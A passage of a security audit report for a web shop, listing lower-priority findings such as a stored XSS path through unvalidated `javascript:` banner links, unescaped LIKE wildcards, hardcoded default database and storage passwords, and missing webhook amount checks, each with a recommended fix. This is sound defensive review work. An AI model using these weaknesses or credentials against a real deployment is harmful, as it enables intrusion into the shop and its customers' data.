### Testes necessários

- Unit: `robots()` disallows `/order`.
- Integration: the confirmation page response contains
  `<meta name="robots" content="noindex">`.

---

## Remaining security findings (P3)

| ID | Finding | Localização | Impacto & Recomendação |
|---|---|---|---|
| **SEC-07** | No Zod string has a `.max()`, so an anonymous guest can persist ~1 MB per field into `order.shipping_address` and into outbound email. Full detail in [`03-backend.md`](03-backend.md#val-01). | all of `apps/web/lib/schemas/` | Segurança: médio (unauthenticated resource amplification). Add explicit maxima; mirror the critical ones as DB `CHECK`s. **Tracked as VAL-01, P2.** |
| **SEC-09** | `bannerSchema.ctaHref` is `z.string().optional()` — no URL validation at all — and is rendered as `<Link href={current.ctaHref}>` on the homepage. An admin (or anyone who compromises an admin account) can store a `javascript:` URL that executes for every visitor. `categorySchema.imageUrl` / `bannerSchema.imageUrl` accept any scheme too. | `lib/schemas/banner.ts:8`, `components/hero-carousel.tsx:49`, `components/promo-sections.tsx` | Segurança: médio (stored XSS, requires admin). Admin is a trusted role, so this is privilege-escalation-from-admin rather than a boundary break — but it is one input away from being a real stored XSS, and CSP (SEC-03) would neutralise it. Validate: allow only a relative path or an `https:` absolute URL. |
| **SEC-10** | `listProducts` passes the user-supplied `material` filter to `ilike(product.material, params.material)` with no escaping of `%` and `_`. Drizzle parameterises the value so there is **no injection**, but the wildcards are interpreted — `?material=%25` matches every material. | `queries/products.ts:161` | Segurança: baixo, Correção: baixo. The filter is populated from a `<select>` of known materials, so this only affects hand-crafted URLs and yields nothing sensitive. Escape `%`/`_`, or switch to `eq()` since the UI only ever sends exact values. |
| **SEC-11** | `docker-compose.prod.yml` hardcodes `POSTGRES_PASSWORD: medivi` and `MINIO_ROOT_PASSWORD: medivi-local-dev` in a file whose name and header say "production" / "self-host". `docker/docker-compose.yml` (dev) publishes Postgres, Redis and MinIO on `0.0.0.0` (`"5432:5432"` etc.), exposing them to the whole LAN. | `docker/docker-compose.prod.yml:9, 48-49, 76-77`; `docker/docker-compose.yml:11-12, 23-24, 41-43` | Segurança: médio. For prod: move both to `${POSTGRES_PASSWORD:?required}` / `${MINIO_ROOT_PASSWORD:?required}` so compose refuses to start without them, and document in `runbook.md`. For dev: bind to `127.0.0.1:5432:5432` etc., matching what `tasks.md` 11.6 already did for the prod Postgres port. |
| **SEC-12** | The webhook never compares the captured amount/currency to the order's stored total, and never reconciles `payment.amount_cents`. Signature verification makes forgery infeasible, so this is defence-in-depth — but it is the standard guard against a session created for one amount and completed for another. | `app/api/webhooks/stripe/route.ts:40-49`; `packages/payments/src/providers/stripe.ts:87` | Segurança: baixo, Correção: médio. Pass `amountCents`/`currency` into `fulfillPaidOrder`; on mismatch do **not** mark paid — return an `amount_mismatch` outcome, log at `error`, and surface it for manual review. Also detailed in [`03-backend.md`](03-backend.md). |
| **SEC-13** | Better Auth's `rateLimit: { window: 60, max: 30 }` auto-enables **in production only** (its documented default). In development and in the E2E/CI environment there is no sign-in rate limiting at all, so no test can ever exercise it. | `lib/auth.ts:53-59` | Segurança: baixo (the production path is protected). Manutenção: médio. Set `enabled: true` explicitly and use a permissive limit in non-production, so the code path is at least exercised; add one test asserting repeated failed sign-ins are throttled. |
| **SEC-14** | `signIn.email`'s server error message is rendered verbatim: `setServerError(error.message ?? "Invalid email or password.")`. Better Auth's messages are user-safe today, but this forwards whatever the library returns straight to the UI. | `app/(account)/sign-in/sign-in-form.tsx:43` | Segurança: baixo. Map known `error.code` values to your own copy (the file already does this correctly for `EMAIL_NOT_VERIFIED`) and use a generic fallback for everything else, rather than echoing the library's text. |
| **SEC-15** | `uploadProductImageAction` stores the object with `ContentType: file.type` — a value supplied by the browser. `imageSize()` does sniff the real format and rejects non-images, so a mismatch is largely closed. But the stored content type is never derived from the sniffed format. | `lib/actions/admin-products.ts:110`; `packages/storage/src/providers/s3.ts:50` | Segurança: baixo (admin-only, and `imageSize` gates it). Set `ContentType` from `imageSize()`'s detected `type` rather than `file.type`, and serve uploads with `X-Content-Type-Options: nosniff` (SEC-03). |
